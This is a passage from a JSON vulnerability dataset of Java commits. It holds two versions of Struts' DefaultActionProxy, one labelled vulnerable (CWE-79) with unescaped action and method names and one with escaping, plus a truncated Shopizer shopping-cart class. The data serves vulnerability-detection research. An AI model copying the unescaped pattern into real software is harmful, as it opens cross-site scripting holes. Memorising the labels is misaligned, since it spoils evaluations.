com.opensymphony.xwork2.util.logging.Logger;\nimport com.opensymphony.xwork2.util.logging.LoggerFactory;\nimport com.opensymphony.xwork2.util.profiling.UtilTimerStack;\n\nimport java.io.Serializable;\nimport java.util.Locale;\n\nimport org.apache.commons.lang.StringUtils;\n\n\n/**\n * The Default ActionProxy implementation\n *\n * @author Rainer Hermanns\n * @author Revised by <a href=\"mailto:hu_pengfei@yahoo.com.cn\">Henry Hu</a>\n * @author tmjee\n * \n * @version $Date$ $Id$\n * @since 2005-8-6\n */\npublic class DefaultActionProxy implements ActionProxy, Serializable {\n\t\n\tprivate static final long serialVersionUID = 3293074152487468527L;\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(DefaultActionProxy.class);\n\n    protected Configuration configuration;\n    protected ActionConfig config;\n    protected ActionInvocation invocation;\n    protected UnknownHandlerManager unknownHandlerManager;\n    protected String actionName;\n    protected String namespace;\n    protected String method;\n    protected boolean executeResult;\n    protected boolean cleanupContext;\n\n    protected ObjectFactory objectFactory;\n\n    protected ActionEventListener actionEventListener;\n\n    /**\n     * This constructor is private so the builder methods (create*) should be used to create an DefaultActionProxy.\n     * <p/>\n     * The reason for the builder methods is so that you can use a subclass to create your own DefaultActionProxy instance\n     * (like a RMIActionProxy).\n     */\n    protected DefaultActionProxy(ActionInvocation inv, String namespace, String actionName, String methodName, boolean executeResult, boolean cleanupContext) {\n        \n        this.invocation = inv;\n\t\tthis.cleanupContext = cleanupContext;\n\t\tif (LOG.isDebugEnabled()) {\n\t\t\tLOG.debug(\"Creating an DefaultActionProxy for namespace \" + namespace + \" and action name \" + actionName);\n\t\t}\n\n\t\tthis.actionName = actionName;\n\t\tthis.namespace = namespace;\n\t\tthis.executeResult = executeResult;\n        this.method = methodName;\n    }\n    \n    @Inject\n    public void setObjectFactory(ObjectFactory factory) {\n        this.objectFactory = factory;\n    }\n    \n    @Inject\n    public void setConfiguration(Configuration config) {\n        this.configuration = config;\n    }\n    \n    @Inject\n    public void setUnknownHandler(UnknownHandlerManager unknownHandlerManager) {\n        this.unknownHandlerManager = unknownHandlerManager;\n    }\n    \n    @Inject(required=false) \n    public void setActionEventListener(ActionEventListener listener) {\n        this.actionEventListener = listener;\n    }\n\n    public Object getAction() {\n        return invocation.getAction();\n    }\n\n    public String getActionName() {\n        return actionName;\n    }\n\n    public ActionConfig getConfig() {\n        return config;\n    }\n    \n    public void setExecuteResult(boolean executeResult) {\n        this.executeResult = executeResult;\n    }\n\n    public boolean getExecuteResult() {\n        return executeResult;\n    }\n\n    public ActionInvocation getInvocation() {\n        return invocation;\n    }\n\n    public String getNamespace() {\n        return namespace;\n    }\n\n    public String execute() throws Exception {\n        ActionContext nestedContext = ActionContext.getContext();\n        ActionContext.setContext(invocation.getInvocationContext());\n\n        String retCode = null;\n\n        String profileKey = \"execute: \";\n        try {\n        \tUtilTimerStack.push(profileKey);\n        \t\n            retCode = invocation.invoke();\n        } finally {\n            if (cleanupContext) {\n                ActionContext.setContext(nestedContext);\n            }\n            UtilTimerStack.pop(profileKey);\n        }\n\n        return retCode;\n    }\n\n\n    public String getMethod() {\n        return method;\n    }\n\n    private void resolveMethod() {\n        // if the method is set to null, use the one from the configuration\n        // if the one from the configuration is also null, use \"execute\"\n        if (StringUtils.isEmpty(this.method)) {\n            this.method = config.getMethodName();\n            if (StringUtils.isEmpty(this.method)) {\n                this.method = \"execute\";\n            }\n        }\n    }\n\n    protected void prepare()  {\n        String profileKey = \"create DefaultActionProxy: \";\n        try {\n            UtilTimerStack.push(profileKey);\n            config = configuration.getRuntimeConfiguration().getActionConfig(namespace, actionName);\n    \n            if (config == null && unknownHandlerManager.hasUnknownHandlers()) {\n                config = unknownHandlerManager.handleUnknownAction(namespace, actionName);\n            }\n            if (config == null) {\n                String message;\n    \n                if ((namespace != null) && (namespace.trim().length() > 0)) {\n                    message = LocalizedTextUtil.findDefaultText(XWorkMessages.MISSING_PACKAGE_ACTION_EXCEPTION, Locale.getDefault(), new String[]{\n                        namespace, actionName\n                    });\n                } else {\n                    message = LocalizedTextUtil.findDefaultText(XWorkMessages.MISSING_ACTION_EXCEPTION, Locale.getDefault(), new String[]{\n                        actionName\n                    });\n                }\n                throw new ConfigurationException(message);\n            }\n\n            resolveMethod();\n            \n            if (!config.isAllowedMethod(method)) {\n                throw new ConfigurationException(\"Invalid method: \"+method+\" for action \"+actionName);\n            }\n\n            invocation.init(this);\n\n        } finally {\n            UtilTimerStack.pop(profileKey);\n        }\n    }\n}",
    "target": 1,
    "language": "java",
    "dataset": "A-Manually-Curated-Dataset-of-Vulnerability-Introducing-Commits-in-Java",
    "idx": 800092,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * Copyright 2002-2006,2009 The Apache Software Foundation.\n * \n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n * \n *      http://www.apache.org/licenses/LICENSE-2.0\n * \n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage com.opensymphony.xwork2;\n\nimport com.opensymphony.xwork2.config.Configuration;\nimport com.opensymphony.xwork2.config.ConfigurationException;\nimport com.opensymphony.xwork2.config.entities.ActionConfig;\nimport com.opensymphony.xwork2.inject.Inject;\nimport com.opensymphony.xwork2.util.LocalizedTextUtil;\nimport com.opensymphony.xwork2.util.logging.Logger;\nimport com.opensymphony.xwork2.util.logging.LoggerFactory;\nimport com.opensymphony.xwork2.util.profiling.UtilTimerStack;\nimport org.apache.commons.lang.StringEscapeUtils;\nimport org.apache.commons.lang.StringUtils;\n\nimport java.io.Serializable;\nimport java.util.Locale;\n\n\n/**\n * The Default ActionProxy implementation\n *\n * @author Rainer Hermanns\n * @author Revised by <a href=\"mailto:hu_pengfei@yahoo.com.cn\">Henry Hu</a>\n * @author tmjee\n * \n * @version $Date$ $Id$\n * @since 2005-8-6\n */\npublic class DefaultActionProxy implements ActionProxy, Serializable {\n\t\n\tprivate static final long serialVersionUID = 3293074152487468527L;\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(DefaultActionProxy.class);\n\n    protected Configuration configuration;\n    protected ActionConfig config;\n    protected ActionInvocation invocation;\n    protected UnknownHandlerManager unknownHandlerManager;\n    protected String actionName;\n    protected String namespace;\n    protected String method;\n    protected boolean executeResult;\n    protected boolean cleanupContext;\n\n    protected ObjectFactory objectFactory;\n\n    protected ActionEventListener actionEventListener;\n\n    /**\n     * This constructor is private so the builder methods (create*) should be used to create an DefaultActionProxy.\n     * <p/>\n     * The reason for the builder methods is so that you can use a subclass to create your own DefaultActionProxy instance\n     * (like a RMIActionProxy).\n     */\n    protected DefaultActionProxy(ActionInvocation inv, String namespace, String actionName, String methodName, boolean executeResult, boolean cleanupContext) {\n        \n        this.invocation = inv;\n\t\tthis.cleanupContext = cleanupContext;\n\t\tif (LOG.isDebugEnabled()) {\n\t\t\tLOG.debug(\"Creating an DefaultActionProxy for namespace \" + namespace + \" and action name \" + actionName);\n\t\t}\n\n        this.actionName = StringEscapeUtils.escapeHtml(actionName);\n        this.namespace = namespace;\n        this.executeResult = executeResult;\n        this.method = StringEscapeUtils.escapeJavaScript(StringEscapeUtils.escapeHtml(methodName));\n    }\n    \n    @Inject\n    public void setObjectFactory(ObjectFactory factory) {\n        this.objectFactory = factory;\n    }\n    \n    @Inject\n    public void setConfiguration(Configuration config) {\n        this.configuration = config;\n    }\n    \n    @Inject\n    public void setUnknownHandler(UnknownHandlerManager unknownHandlerManager) {\n        this.unknownHandlerManager = unknownHandlerManager;\n    }\n    \n    @Inject(required=false) \n    public void setActionEventListener(ActionEventListener listener) {\n        this.actionEventListener = listener;\n    }\n\n    public Object getAction() {\n        return invocation.getAction();\n    }\n\n    public String getActionName() {\n        return actionName;\n    }\n\n    public ActionConfig getConfig() {\n        return config;\n    }\n    \n    public void setExecuteResult(boolean executeResult) {\n        this.executeResult = executeResult;\n    }\n\n    public boolean getExecuteResult() {\n        return executeResult;\n    }\n\n    public ActionInvocation getInvocation() {\n        return invocation;\n    }\n\n    public String getNamespace() {\n        return namespace;\n    }\n\n    public String execute() throws Exception {\n        ActionContext nestedContext = ActionContext.getContext();\n        ActionContext.setContext(invocation.getInvocationContext());\n\n        String retCode = null;\n\n        String profileKey = \"execute: \";\n        try {\n        \tUtilTimerStack.push(profileKey);\n        \t\n            retCode = invocation.invoke();\n        } finally {\n            if (cleanupContext) {\n                ActionContext.setContext(nestedContext);\n            }\n            UtilTimerStack.pop(profileKey);\n        }\n\n        return retCode;\n    }\n\n\n    public String getMethod() {\n        return method;\n    }\n\n    private void resolveMethod() {\n        // if the method is set to null, use the one from the configuration\n        // if the one from the configuration is also null, use \"execute\"\n        if (StringUtils.isEmpty(this.method)) {\n            this.method = config.getMethodName();\n            if (StringUtils.isEmpty(this.method)) {\n                this.method = \"execute\";\n            }\n        }\n    }\n\n    protected void prepare()  {\n        String profileKey = \"create DefaultActionProxy: \";\n        try {\n            UtilTimerStack.push(profileKey);\n            config = configuration.getRuntimeConfiguration().getActionConfig(namespace, actionName);\n    \n            if (config == null && unknownHandlerManager.hasUnknownHandlers()) {\n                config = unknownHandlerManager.handleUnknownAction(namespace, actionName);\n            }\n            if (config == null) {\n                String message;\n    \n                if ((namespace != null) && (namespace.trim().length() > 0)) {\n                    message = LocalizedTextUtil.findDefaultText(XWorkMessages.MISSING_PACKAGE_ACTION_EXCEPTION, Locale.getDefault(), new String[]{\n                        namespace, actionName\n                    });\n                } else {\n                    message = LocalizedTextUtil.findDefaultText(XWorkMessages.MISSING_ACTION_EXCEPTION, Locale.getDefault(), new String[]{\n                        actionName\n                    });\n                }\n                throw new ConfigurationException(message);\n            }\n\n            resolveMethod();\n            \n            if (!config.isAllowedMethod(method)) {\n                throw new ConfigurationException(\"Invalid method: \"+method+\" for action \"+actionName);\n            }\n\n            invocation.init(this);\n\n        } finally {\n            UtilTimerStack.pop(profileKey);\n        }\n    }\n}",
    "target": 0,
    "language": "java",
    "dataset": "A-Manually-Curated-Dataset-of-Vulnerability-Introducing-Commits-in-Java",
    "idx": 800093,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/**\n *\n */\npackage com.salesmanager.shop.store.controller.shoppingCart.facade;\n\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.UUID;\n\nimport javax.inject.Inject;\nimport javax.persistence.NoResultException;\n\nimport org.apache.commons.collections4.CollectionUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.apache.commons.lang3.Validate;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.beans.factory.annotation.Qualifier;\nimport org.springframework.stereotype.Service;\nimport org.springframework.web.context.request.RequestContextHolder;\nimport org.springframework.web.context.request.ServletRequestAttributes;\n\nimport com.salesmanager.core.business.exception.ServiceException;\nimport com.salesmanager.core.business.services.catalog.product.PricingService;\nimport com.salesmanager.core.business.services.catalog.product.ProductService;\nimport com.salesmanager.core.business.services.catalog.product.attribute.ProductAttributeService;\nimport com.salesmanager.core.business.services.shoppingcart.ShoppingCartCalculationService;\nimport com.salesmanager.core.business.services.shoppingcart.ShoppingCartService;\nimport com.salesmanager.core.business.utils.ProductPriceUtils;\nimport com.salesmanager.core.model.catalog.product.Product;\nimport com.salesmanager.core.model.catalog.product.attribute.ProductAttribute;\nimport com.salesmanager.core.model.catalog.product.availability.ProductAvailability;\nimport com.salesmanager.core.model.catalog.product.price.FinalPrice;\nimport com.salesmanager.core.model.customer.Customer;\nimport com.salesmanager.core.model.merchant.MerchantStore;\nimport com.salesmanager.core.model.reference.language.Language;\nimport com.salesmanager.core.model.shoppingcart.ShoppingCart;\nimport com.salesmanager.shop.constants.Constants;\nimport com.salesmanager.shop.model.shoppingcart.CartModificationException;\nimport com.salesmanager.shop.model.shoppingcart.PersistableShoppingCartItem;\nimport com.salesmanager.shop.model.shoppingcart.ReadableShoppingCart;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartAttribute;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartData;\nimport com.salesmanager.shop.model.shoppingcart.ShoppingCartItem;\nimport com.salesmanager.shop.populator.shoppingCart.ReadableShoppingCartPopulator;\nimport com.salesmanager.shop.populator.shoppingCart.ShoppingCartDataPopulator;\nimport com.salesmanager.shop.store.api.exception.ResourceNotFoundException;\nimport com.salesmanager.shop.utils.DateUtil;\nimport com.salesmanager.shop.utils.ImageFilePath;\n\n/**\n * @author Umesh Awasthi\n * @version 1.0\n * @since 1.0\n */\n@Service( value = \"shoppingCartFacade\" )\npublic class ShoppingCartFacadeImpl\n    implements ShoppingCartFacade\n{\n\n    \n    private static final Logger LOG = LoggerFactory.getLogger(ShoppingCartFacadeImpl.class);\n\n    @Inject\n    private ShoppingCartService shoppingCartService;\n\n    @Inject\n    ShoppingCartCalculationService shoppingCartCalculationService;\n\n    @Inject\n    private ProductPriceUtils productPriceUtils;\n\n    @Inject\n    private ProductService productService;\n\n    @Inject\n    private PricingService pricingService;\n\n    @Inject\n    private ProductAttributeService productAttributeService;\n\n\t@Inject\n\t@Qualifier(\"img\")\n\tprivate ImageFilePath imageUtils;\n\n    public void deleteShoppingCart(final Long id, final MerchantStore store) throws Exception {\n    \tShoppingCart cart = shoppingCartService.getById(id, store);\n    \tif(cart!=null) {\n    \t\tshoppingCartService.deleteCart(cart);\n    \t}\n    }\n    \n    @Override\n    public void deleteShoppingCart(final String code, final MerchantStore store) throws Exception {\n    \tShoppingCart cart = shoppingCartService.getByCode(code, store);\n    \tif(cart!=null) {\n    \t\tshoppingCartService.deleteCart(cart);\n    \t}\n    }\n\n    @Override\n    public ShoppingCartData addItemsToShoppingCart( final ShoppingCartData shoppingCartData,\n                                                    final ShoppingCartItem item, final MerchantStore store, final Language language,final Customer customer )\n        throws Exception\n    {\n\n        ShoppingCart cartModel = null;\n        \n        /**\n         * Sometimes a user logs in and a shopping cart is present in db (shoppingCartData\n         * but ui has no cookie with shopping cart code so the cart code will have\n         * to be added to the item in order to process add to cart normally\n         */\n        if(shoppingCartData != null && StringUtils.isBlank(item.getCode())) {\n        \titem.setCode(shoppingCartData.getCode());\n        }\n        \n        \n        if ( !StringUtils.isBlank( item.getCode() ) )\n        {\n            // get it from the db\n            cartModel = getShoppingCartModel( item.getCode(), store );\n            if ( cartModel == null )\n            {\n                cartModel = createCartModel( shoppingCartData.getCode(), store,customer );\n            }\n\n        }\n\n        if ( cartModel == null )\n        {\n\n            final String shoppingCartCode =\n                StringUtils.isNotBlank( shoppingCartData.getCode() ) ? shoppingCartData.getCode() : null;\n            cartModel = createCartModel( shoppingCartCode, store,customer );\n\n        }\n        com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem =\n            createCartItem( cartModel, item, store );\n        \n        \n        boolean duplicateFound = false;\n        if(CollectionUtils.isEmpty(item.getShoppingCartAttributes())) {//increment quantity\n        \t//get duplicate item from the cart\n        \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartModelItems = cartModel.getLineItems();\n        \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem cartItem : cartModelItems) {\n        \t\tif(cartItem.getProduct().getId().longValue()==shoppingCartItem.getProduct().getId().longValue()) {\n        \t\t\tif(CollectionUtils.isEmpty(cartItem.getAttributes())) {\n        \t\t\t\tif(!duplicateFound) {\n        \t\t\t\t\tif(!shoppingCartItem.isProductVirtual()) {\n\t        \t\t\t\t\tcartItem.setQuantity(cartItem.getQuantity() + shoppingCartItem.getQuantity());\n        \t\t\t\t\t}\n        \t\t\t\t\tduplicateFound = true;\n        \t\t\t\t\tbreak;\n        \t\t\t\t}\n        \t\t\t}\n        \t\t}\n        \t}\n        }\n        \n        if(!duplicateFound) {\n        \t//shoppingCartItem.getAttributes().stream().forEach(a -> {a.setProductAttributeId(productAttributeId);});\n        \tcartModel.getLineItems().add( shoppingCartItem );\n        }\n        \n        /** Update cart in database with line items **/\n        shoppingCartService.saveOrUpdate( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n\n\n        return shoppingCartDataPopulator.populate( cartModel, store, language );\n    }\n\n    private com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem( final ShoppingCart cartModel,\n                                                                                               final ShoppingCartItem shoppingCartItem,\n                                                                                               final MerchantStore store )\n        throws Exception\n    {\n\n        Product product = productService.getById( shoppingCartItem.getProductId() );\n\n        if ( product == null )\n        {\n            throw new Exception( \"Item with id \" + shoppingCartItem.getProductId() + \" does not exist\" );\n        }\n\n        if ( product.getMerchantStore().getId().intValue() != store.getId().intValue() )\n        {\n            throw new Exception( \"Item with id \" + shoppingCartItem.getProductId() + \" does not belong to merchant \"\n                + store.getId() );\n        }\n        \n\t\t/**\n\t\t * Check if product quantity is 0\n\t\t * Check if product is available\n\t\t * Check if date available <= now\n\t\t */\n        \n        Set<ProductAvailability> availabilities = product.getAvailabilities();\n        if(availabilities == null) {\n        \t\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not properly configured\" );\n        \t\n        }\n        \t\n        for(ProductAvailability availability : availabilities) {\n        \tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() ==0) {\n                throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        \t}\n        }\n        \n        if(!product.isAvailable()) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n        \n        if(!DateUtil.dateBeforeEqualsDate(product.getDateAvailable(), new Date())) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n\n\n        com.salesmanager.core.model.shoppingcart.ShoppingCartItem item =\n            shoppingCartService.populateShoppingCartItem( product );\n\n        item.setQuantity( shoppingCartItem.getQuantity() );\n        item.setShoppingCart( cartModel );\n\n        // attributes\n        List<ShoppingCartAttribute> cartAttributes = shoppingCartItem.getShoppingCartAttributes();\n        if ( !CollectionUtils.isEmpty( cartAttributes ) )\n        {\n            for ( ShoppingCartAttribute attribute : cartAttributes )\n            {\n                ProductAttribute productAttribute = productAttributeService.getById( attribute.getAttributeId() );\n                if ( productAttribute != null\n                    && productAttribute.getProduct().getId().longValue() == product.getId().longValue() )\n                {\n                    com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem attributeItem =\n                        new com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem( item,\n                                                                                                         productAttribute );\n\n                    item.addAttributes( attributeItem );\n                }\n            }\n        }\n        return item;\n\n    }\n\n    \n    //used for api\n\tprivate com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem(ShoppingCart cartModel,\n\t\t\t PersistableShoppingCartItem shoppingCartItem, MerchantStore store) throws Exception {\n\n\t\tProduct product = productService.getById(shoppingCartItem.getProduct());\n\n\t\tif (product == null) {\n\t\t\tthrow new ResourceNotFoundException(\"Item with id \" + shoppingCartItem.getProduct() + \" does not exist\");\n\t\t}\n\n\t\tif (product.getMerchantStore().getId().intValue() != store.getId().intValue()) {\n\t\t\tthrow new ResourceNotFoundException(\"Item with id \" + shoppingCartItem.getProduct() + \" does not belong to merchant \"\n\t\t\t\t\t+ store.getId());\n\t\t}\n\t\t\n\t\t/**\n\t\t * Check if product quantity is 0\n\t\t * Check if product is available\n\t\t * Check if date available <= now\n\t\t */\n        \n        Set<ProductAvailability> availabilities = product.getAvailabilities();\n        if(availabilities == null) {\n        \t\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not properly configured\" );\n        \t\n        }\n        \t\n        for(ProductAvailability availability : availabilities) {\n        \tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() ==0) {\n                throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        \t}\n        }\n        \n        if(!product.isAvailable()) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n        \n        if(!DateUtil.dateBeforeEqualsDate(product.getDateAvailable(), new Date())) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n\t\t\n\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem item = shoppingCartService\n\t\t\t\t.populateShoppingCartItem(product);\n\n\t\titem.setQuantity(shoppingCartItem.getQuantity());\n\t\titem.setShoppingCart(cartModel);\n\t\t\n\t\t//set attributes\n\t\tList<com.salesmanager.shop.model.catalog.product.attribute.ProductAttribute> attributes = shoppingCartItem.getAttributes();\n\t\tif (!CollectionUtils.isEmpty(attributes)) {\n\t\t\tfor(com.salesmanager.shop.model.catalog.product.attribute.ProductAttribute attribute : attributes) {\n\t\t\t\t\n\t\t\t\tProductAttribute productAttribute = productAttributeService.getById(attribute.getId());\n\t\t\t\t\n\t\t\t\tif (productAttribute != null\n\t\t\t\t\t\t&& productAttribute.getProduct().getId().longValue() == product.getId().longValue()) {\n\t\t\t\t\t\n\t\t\t\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem attributeItem = new com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem(\n\t\t\t\t\t\t\titem, productAttribute);\n\n\t\t\t\t\titem.addAttributes(attributeItem);\n\t\t\t\t}\t\t\t\t\n\t\t\t}\n\t\t}\n\n\t\treturn item;\n\n\t}   \n    \n\n    @Override\n    public ShoppingCart createCartModel( final String shoppingCartCode, final MerchantStore store,final Customer customer )\n        throws Exception\n    {\n        final Long CustomerId = customer != null ? customer.getId() : null;\n        ShoppingCart cartModel = new ShoppingCart();\n        if ( StringUtils.isNotBlank( shoppingCartCode ) )\n        {\n            cartModel.setShoppingCartCode( shoppingCartCode );\n        }\n        else\n        {\n            cartModel.setShoppingCartCode( uniqueShoppingCartCode() );\n        }\n\n        cartModel.setMerchantStore( store );\n        if ( CustomerId != null )\n        {\n            cartModel.setCustomerId( CustomerId );\n        }\n        shoppingCartService.create( cartModel );\n        return cartModel;\n    }\n\n\n\n\n\n    private com.salesmanager.core.model.shoppingcart.ShoppingCartItem getEntryToUpdate( final long entryId,\n                                                                                                 final ShoppingCart cartModel )\n    {\n        if ( CollectionUtils.isNotEmpty( cartModel.getLineItems() ) )\n        {\n            for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cartModel.getLineItems() )\n            {\n                if ( shoppingCartItem.getId().longValue() == entryId )\n                {\n                    LOG.info( \"Found line item  for given entry id: \" + entryId );\n                    return shoppingCartItem;\n\n                }\n            }\n        }\n        LOG.info( \"Unable to find any entry for given Id: \" + entryId );\n        return null;\n    }\n\n    private Object getKeyValue( final String key )\n    {\n        ServletRequestAttributes reqAttr = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();\n        return reqAttr.getRequest().getAttribute( key );\n    }\n\n    @Override\n    public ShoppingCartData getShoppingCartData( final Customer customer, final MerchantStore store,\n                                                 final String shoppingCartId, Language language)\n        throws Exception\n    {\n\n        ShoppingCart cart = null;\n        try\n        {\n            if ( customer != null )\n            {\n                LOG.info( \"Reteriving customer shopping cart...\" );\n\n                cart = shoppingCartService.getShoppingCart( customer );\n\n            }\n\n            else\n            {\n                if ( StringUtils.isNotBlank( shoppingCartId ) && cart == null )\n                {\n                    cart = shoppingCartService.getByCode( shoppingCartId, store );\n                }\n\n            }\n        }\n        catch ( ServiceException ex )\n        {\n            LOG.error( \"Error while retriving cart from customer\", ex );\n        }\n        catch( NoResultException nre) {\n        \t//nothing\n        }\n\n        if ( cart == null )\n        {\n            return null;\n        }\n\n        LOG.info( \"Cart model found.\" );\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n\n        //Language language = (Language) getKeyValue( Constants.LANGUAGE );\n        MerchantStore merchantStore = (MerchantStore) getKeyValue( Constants.MERCHANT_STORE );\n        \n        ShoppingCartData shoppingCartData = shoppingCartDataPopulator.populate( cart, merchantStore, language );\n        \n/*        List<ShoppingCartItem> unavailables = new ArrayList<ShoppingCartItem>();\n        List<ShoppingCartItem> availables = new ArrayList<ShoppingCartItem>();\n        //Take out items no more available\n        List<ShoppingCartItem> items = shoppingCartData.getShoppingCartItems();\n        for(ShoppingCartItem item : items) {\n        \tString code = item.getProductCode();\n        \tProduct p =productService.getByCode(code, language);\n        \tif(!p.isAvailable()) {\n        \t\tunavailables.add(item);\n        \t} else {\n        \t\tavailables.add(item);\n        \t}\n        \t\n        }\n        shoppingCartData.setShoppingCartItems(availables);\n        shoppingCartData.setUnavailables(unavailables);*/\n        \n        return shoppingCartData;\n\n    }\n\n    //@Override\n    public ShoppingCartData getShoppingCartData( final ShoppingCart shoppingCartModel, Language language)\n        throws Exception\n    {\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n        //Language language = (Language) getKeyValue( Constants.LANGUAGE );\n        MerchantStore merchantStore = (MerchantStore) getKeyValue( Constants.MERCHANT_STORE );\n        return shoppingCartDataPopulator.populate( shoppingCartModel, merchantStore, language );\n    }\n\n\t@Override\n    public ShoppingCartData removeCartItem( final Long itemID, final String cartId ,final MerchantStore store,final Language language )\n        throws Exception\n    {\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n\n            ShoppingCart cartModel = getCartModel( cartId,store );\n            if ( cartModel != null )\n            {\n                if ( CollectionUtils.isNotEmpty( cartModel.getLineItems() ) )\n                {\n                    Set<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> shoppingCartItemSet =\n                        new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n                    for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cartModel.getLineItems() )\n                    {\n                        if(shoppingCartItem.getId().longValue() == itemID.longValue() )\n                        {\n                    \t\tshoppingCartService.deleteShoppingCartItem(itemID);\n                        } else {\n                            shoppingCartItemSet.add(shoppingCartItem);\n                        }\n                    }\n                    \n                    cartModel.setLineItems(shoppingCartItemSet);\n\n\n                    ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n                    shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n                    shoppingCartDataPopulator.setPricingService( pricingService );\n                    shoppingCartDataPopulator.setimageUtils(imageUtils);\n                    return shoppingCartDataPopulator.populate( cartModel, store, language );\n                    \n\n                }\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public ShoppingCartData updateCartItem( final Long itemID, final String cartId, final long newQuantity,final MerchantStore store, final Language language )\n        throws Exception\n    {\n        if ( newQuantity < 1 )\n        {\n            throw new CartModificationException( \"Quantity must not be less than one\" );\n        }\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n            ShoppingCart cartModel = getCartModel( cartId,store );\n            if ( cartModel != null )\n            {\n                com.salesmanager.core.model.shoppingcart.ShoppingCartItem entryToUpdate =\n                    getEntryToUpdate( itemID.longValue(), cartModel );\n\n                if ( entryToUpdate == null )\n                {\n                    throw new CartModificationException( \"Unknown entry number.\" );\n                }\n\n                entryToUpdate.getProduct();\n\n                LOG.info( \"Updating cart entry quantity to\" + newQuantity );\n                entryToUpdate.setQuantity( (int) newQuantity );\n                List<ProductAttribute> productAttributes = new ArrayList<ProductAttribute>();\n                productAttributes.addAll( entryToUpdate.getProduct().getAttributes() );\n                final FinalPrice finalPrice =\n                    productPriceUtils.getFinalProductPrice( entryToUpdate.getProduct(), productAttributes );\n                entryToUpdate.setItemPrice( finalPrice.getFinalPrice() );\n                shoppingCartService.saveOrUpdate( cartModel );\n\n                LOG.info( \"Cart entry updated with desired quantity\" );\n                ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n                shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n                shoppingCartDataPopulator.setPricingService( pricingService );\n                shoppingCartDataPopulator.setimageUtils(imageUtils);\n                return shoppingCartDataPopulator.populate( cartModel, store, language );\n\n            }\n        }\n        return null;\n    }\n    \n    @SuppressWarnings(\"unchecked\")\n\t@Override\n    public ShoppingCartData updateCartItems( final List<ShoppingCartItem> shoppingCartItems, final MerchantStore store, final Language language )\n            throws Exception\n        {\n    \t\n    \t\tValidate.notEmpty(shoppingCartItems,\"shoppingCartItems null or empty\");\n    \t\tShoppingCart cartModel = null;\n    \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n    \t\tfor(ShoppingCartItem item : shoppingCartItems) {\n    \t\t\t\n    \t\t\tif(item.getQuantity()<1) {\n    \t\t\t\tthrow new CartModificationException( \"Quantity must not be less than one\" );\n    \t\t\t}\n    \t\t\t\n    \t\t\tif(cartModel==null) {\n    \t\t\t\tcartModel = getCartModel( 